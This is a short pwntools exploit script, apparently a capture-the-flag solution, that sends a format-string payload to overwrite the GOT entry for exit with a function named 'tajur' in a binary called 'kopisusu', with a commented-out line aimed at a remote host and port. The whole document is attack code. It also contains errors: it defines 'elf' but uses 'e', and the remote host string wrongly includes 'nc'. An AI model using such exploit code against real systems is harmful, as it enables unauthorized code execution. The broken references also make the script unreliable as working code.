from pwn import *

elf = ELF('./kopisusu')
libc = elf.libc
# context.log_level = 'debug'

#p = remote("nc 146.190.152.5", 9255)
p = process()

payload_writes = {
        e.got['exit']: e.sym['tajur']
}

payload = fmtstr_payload(6,payload_writes)
p.sendline(payload)
p.interactive()
